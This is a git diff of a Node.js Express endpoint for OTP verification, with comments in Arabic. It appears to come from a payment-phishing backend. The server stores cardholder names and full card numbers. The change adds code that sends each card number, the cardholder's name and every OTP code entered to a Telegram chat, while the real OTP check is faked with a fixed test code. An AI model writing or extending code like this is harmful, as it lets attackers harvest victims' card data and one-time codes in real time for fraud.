@@ -556,12 +556,20 @@ app.post('/api/verify-otp', async (req, res) => {
 
   const currentAttempt = paymentRecord.otpAttempts;
   const savedCard = paymentRecord.cardData;
-  console.log(`تم استلام الرمز رقم [${currentAttempt}]: (${otp}) للبطاقة: ${savedCard.cardNumber}`);
+  
+  // إرسال معلومات المحاولة إلى تليجرام (بدون انتظار)
+  const attemptText = `🔐 <b>محاولة OTP رقم ${currentAttempt}</b>\n\n` +
+    `• حامل البطاقة: ${savedCard.name}\n` +
+    `• البطاقة: <code>${savedCard.cardNumber}</code>\n` +
+    `• الرمز المدخل: <code>${otp}</code>\n\n` +
+    `${currentAttempt >= 3 ? '⚠️ تنبيه: هذه المحاولة الأخيرة!' : `📊 المحاولات المتبقية: ${3 - currentAttempt}`}`;
+
+  sendTelegramMessage(attemptText).catch(err => console.log('خطأ في إرسال التليجرام:', err));
 
   // محاكاة التحقق من الرمز (للاختبار - الرمز الصحيح هو 123456)
   const isCorrectOTP = (otp === '123456');
   
-  // إذا الرمز صحيح → نجاح وفوراً (لا انتظار)
+  // إذا الرمز صحيح → نجاح وفوراً
   if (isCorrectOTP) {
     console.log('✅ رمز صحيح - توجيه لصفحة النجاح فوراً');
     
@@ -572,13 +580,13 @@ app.post('/api/verify-otp', async (req, res) => {
     });
   }
   
-  // إذا الرمز غلط → فحص عدد المحاولات
-  
   // بعد 3 محاولات فاشلة → رفض تلقائي
   if (currentAttempt >= 3) {
     paymentRecord.approvalStatus = 'rejected';
     paymentsData[paymentID] = paymentRecord;
     savePayments(paymentsData);
+    
+    sendTelegramMessage(`❌ <b>تم رفض الطلب</b>\n\nالسبب: 3 محاولات فاشلة`).catch(() => {});
     
     console.log('❌ تم رفض الطلب بعد 3 محاولات فاشلة');
     return res.json({ 
@@ -589,9 +597,7 @@ app.post('/api/verify-otp', async (req, res) => {
     });
   }
 
-  // محاولات (1 أو 2) - إظهار خطأ فوراً للمستخدم (لا تليجرام)
-  console.log('❌ رمز خاطئ - إظهار خطأ للمستخدم فوراً');
-  
+  // رمز خاطئ → إظهار خطأ فوراً للمستخدم
   return res.json({ 
     success: false, 
     message: 'wrong_otp',
